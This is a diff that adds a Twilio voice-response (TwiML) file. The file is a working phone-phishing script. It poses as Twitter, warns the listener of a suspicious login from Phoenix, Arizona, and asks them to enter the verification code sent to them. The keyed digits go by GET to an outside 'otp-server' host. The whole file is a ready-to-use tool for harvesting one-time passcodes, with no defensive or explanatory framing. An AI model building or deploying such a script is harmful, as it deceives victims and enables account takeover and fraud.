@@ -1,0 +1,18 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<Response>
+    <Gather action="https://otp-server.liteeagle262.repl.co" method="GET">
+		<Say>
+			This is a notice about your twitter account.
+			We have noticed some suspicious activity on your account.
+			Your account was just logged into from Phoenix Arizona.
+
+			for security reasons
+			and so we can secure your account
+			we'll need to confirm your identity.
+			please enter the verification code sent to you.
+			when you're finished
+			please press pound
+        </Say>
+    </Gather>
+    <Say>We didn't receive any input. Goodbye!</Say>
+</Response>
